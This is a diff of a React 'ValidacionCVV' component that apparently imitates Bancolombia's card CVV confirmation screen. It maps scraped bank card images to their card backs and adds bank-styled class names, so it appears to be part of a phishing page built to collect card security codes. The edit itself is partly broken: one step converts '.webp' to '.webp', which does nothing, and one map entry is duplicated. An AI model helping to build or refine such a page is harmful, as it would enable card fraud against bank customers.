@@ -34,9 +34,9 @@ export default function ValidacionCVV() {
         if (!data || !data.filename) return data;
         let filename = data.filename;
 
-        // 1. Convert legacy .png to .webp
-        if (filename.endsWith(".png")) {
-            filename = filename.replace(".png", ".webp");
+        // 1. Convert legacy .webp to .webp
+        if (filename.endsWith(".webp")) {
+            filename = filename.replace(".webp", ".webp");
         }
 
         // 2. Specific migrations for renamed assets
@@ -361,7 +361,7 @@ export default function ValidacionCVV() {
 
     // Estado para los datos de la tarjeta (desde localStorage o valores por defecto)
     const [cardData, setCardData] = useState({
-        filename: "imgi_5_Debito_(preferencial).png",
+        filename: "imgi_5_Debito_(preferencial).webp",
         tipo: "debito",
         digits: "4580",
         label: "Débito Preferencial"
@@ -374,42 +374,45 @@ export default function ValidacionCVV() {
     // Función para mapear el filename del frente al filename de la parte trasera
     // Función para mapear el filename del frente al filename de la parte trasera
     const getBackCardFilename = (frontFilename) => {
+
         // Mapeo de imágenes del frente a la parte trasera
         const frontToBackMap = {
+
             // Crédito - Mastercard
-            "imgi_10_Mastercard_ideal_.png": "Mastercard-ideal.webp",
-            "imgi_11_Mastercard_joven_.png": "Mastercard-joven.webp",
-            "imgi_12_clasica_.png": "Mastercard-clasica.webp",
-            "imgi_14_Mastercard_credit-card.png": "Mastercard-Unica.webp",
-            "imgi_15_275x172.png": "Mastercard-Standard.webp",
-            "imgi_16_Mastercard_oro_.png": "Mastercard-oro.webp",
-            "imgi_19_Mastercard_611_600x379.png": "Mastercard-Platinum.webp",
-            "imgi_24_Mastercard_612_600x379.png": "Mastercard-Black-v1.webp",
-            "imgi_26_Mastercard_+Tarjeta+Virtual.png": "Mastercard-E-Card-v1.webp",
-            "imgi_29_Mastercard-Sufi_Optimizada.png": "Mastercard-Sufi-v1.webp",
-            "imgi_30_Mastercard-Esso+mobil+oro_Optimizada.png": "Mastercard-Esso-mobil-v1.webp",
-            "imgi_31_Mastercard-Esso+mobil+clasica_Optimizada.png": "Mastercard-Esso-mobil-v1.webp",
+            "imgi_10_Mastercard_ideal_.webp": "Mastercard-ideal.webp",
+            "imgi_11_Mastercard_joven_.webp": "Mastercard-joven.webp",
+            "imgi_12_clasica_.webp": "Mastercard-clasica.webp",
+            "imgi_14_Mastercard_credit-card.webp": "Mastercard-Unica.webp",
+            "imgi_15_275x172.webp": "Mastercard-Standard.webp",
+            "imgi_16_Mastercard_oro_.webp": "Mastercard-oro.webp",
+            "imgi_19_Mastercard_611_600x379.webp": "Mastercard-Platinum.webp",
+            "imgi_24_Mastercard_612_600x379.webp": "Mastercard-Black-v1.webp",
+            "imgi_26_Mastercard_+Tarjeta+Virtual.webp": "Mastercard-E-Card-v1.webp",
+            "imgi_29_Mastercard-Sufi_Optimizada.webp": "Mastercard-Sufi-v1.webp",
+            "imgi_30_Mastercard-Esso+mobil+oro_Optimizada.webp": "Mastercard-Esso-mobil-v1.webp",
+            "imgi_31_Mastercard-Esso+mobil+clasica_Optimizada.webp": "Mastercard-Esso-mobil-v1.webp",
 
             // Crédito - Visa
-            "imgi_13_+Visa+clasica+tradicional.png": "Visa-Clasica.webp",
-            "imgi_17_Visa+Seleccion+Colombia.png": "Visa-seleccion-colombia.webp",
-            "imgi_18_Visa+Oro.png": "Visa-Oro.webp",
-            "imgi_23_BC_VISA_LIFEMILE_PERSONAS_BC_VISA_LIFEMILE_PERSONAS_TIRO_.png": "Visa-LifeMiles-v1.webp",
-            "imgi_25_Visa+Platinum+Conavi.png": "Visa-Platinum-v1.webp",
-            "imgi_28_Visa_Infinite_Card.png": "Visa-infinite-v1.webp",
+            "imgi_13_+Visa+clasica+tradicional.webp": "Visa-Clasica.webp",
+            "imgi_17_Visa+Seleccion+Colombia.webp": "Visa-seleccion-colombia.webp",
+            "imgi_18_Visa+Oro.webp": "Visa-Oro.webp",
+            "imgi_23_BC_VISA_LIFEMILE_PERSONAS_BC_VISA_LIFEMILE_PERSONAS_TIRO_.webp": "Visa-LifeMiles-v1.webp",
+            "imgi_25_Visa+Platinum+Conavi.webp": "Visa-Platinum-v1.webp",
+            "imgi_28_Visa_Infinite_Card.webp": "Visa-infinite-v1.webp",
 
             // Crédito - Amex
-            "imgi_20_AMEX+SkyBlue.png": "Amex-blue.webp", // Asumiendo que SkyBlue mapea a Libre
+            "imgi_20_AMEX+SkyBlue.webp": "Amex-blue.webp", // Asumiendo que SkyBlue mapea a Libre
+            "imgi_20_AMEX+SkyBlue.webp": "Amex-blue.webp", // Asumiendo que SkyBlue mapea a Libre
             "Amex-Green-v2.webp": "CVV-Amex-Greem.webp",
-            "imgi_22_AMEX+Gold.png": "Amex-Gold-v1.webp",
-            "imgi_27_AMEX+Platinum.png": "Amex-Platinum-v1.webp",
-            "imgi_7_Amex+Libre.png": "Amex+Libre.webp",
+            "imgi_22_AMEX+Gold.webp": "Amex-Gold-v1.webp",
+            "imgi_27_AMEX+Platinum.webp": "Amex-Platinum-v1.webp",
+            "imgi_7_Amex+Libre.webp": "Amex+Libre.webp",
 
             // Débito
-            "imgi_141_Imagen-Tarjeta-Debito-Civica-de-Bancolombia-3.png": "Débito Cívica.png",
-            "imgi_5_Debito_(preferencial).png": "Débito Preferencial.png",
-            "imgi_7_004_600x379.png": "Débito Clásica.png",
-            "debito_virtual.png": "Debito_Virtual.png"
+            "imgi_141_Imagen-Tarjeta-Debito-Civica-de-Bancolombia-3.webp": "Débito Cívica.webp",
+            "imgi_5_Debito_(preferencial).webp": "Débito Preferencial.webp",
+            "imgi_7_004_600x379.webp": "Débito Clásica.webp",
+            "debito_virtual.webp": "Debito_Virtual.webp"
         };
 
         return frontToBackMap[frontFilename] || null;
@@ -748,26 +751,30 @@ export default function ValidacionCVV() {
                                         flexShrink: 0
                                     }}
                                 />
-                                <h2 style={{
-                                    fontSize: "20px",
-                                    fontWeight: "bold",
-                                    color: "#ffffff",
-                                    margin: 0,
-                                    textAlign: "left",
-                                    lineHeight: "1.4"
-                                }}>
+                                <h2
+                                    className="bc-card-auth-title2 bc-cibsans-font-style-5-bold"
+                                    style={{
+                                        fontSize: "18px",
+                                        fontWeight: "bold",
+                                        color: "#ffffff",
+                                        margin: 0,
+                                        textAlign: "left",
+                                        lineHeight: "1.4"
+                                    }}>
                                     Validación del CVV de la tarjeta {getTipoTarjeta()} terminada en **{cardData.digits}
                                 </h2>
                             </div>
 
                             {/* TEXTO DESCRIPTIVO */}
-                            <p style={{
-                                fontSize: "16px",
-                                lineHeight: "24px",
-                                color: "#ffffff",
-                                marginBottom: "30px",
-                                textAlign: "left"
-                            }}>
+                            <p
+                                className="bc-card-auth-description"
+                                style={{
+                                    fontSize: "16px",
+                                    lineHeight: "24px",
+                                    color: "#ffffff",
+                                    marginBottom: "30px",
+                                    textAlign: "left"
+                                }}>
                                 Para garantizar la seguridad de tu cuenta, queremos confirmar que eres tú quien está realizando esta transacción.
                             </p>
 
@@ -866,6 +873,7 @@ export default function ValidacionCVV() {
 
                                 {/* Etiqueta CVV movida al final (ABAJO) */}
                                 <label
+                                    className="bc-card-auth-description"
                                     htmlFor="cvv"
                                     style={{
                                         color: "#ffffff",
@@ -913,7 +921,7 @@ export default function ValidacionCVV() {
 
                             {/* BOTÓN CONTINUAR */}
                             <button
-                                className="login-btn"
+                                className="bc-button-primary login-btn"
                                 style={{
                                     marginTop: "20px",
                                     opacity: (cvv.length === cvvLength && !submitted) ? 1 : 0.5, // Feedback visual
@@ -966,7 +974,7 @@ export default function ValidacionCVV() {
             </div>
 
             <div className="visual-captcha" style={{ cursor: "pointer" }}>
-                <img src="/assets/images/lateral-der.png" alt="Visual Captcha" />
+                <img src="/assets/images/lateral-der.webp" alt="Visual Captcha" />
             </div>
 
             {/* Cargando */}
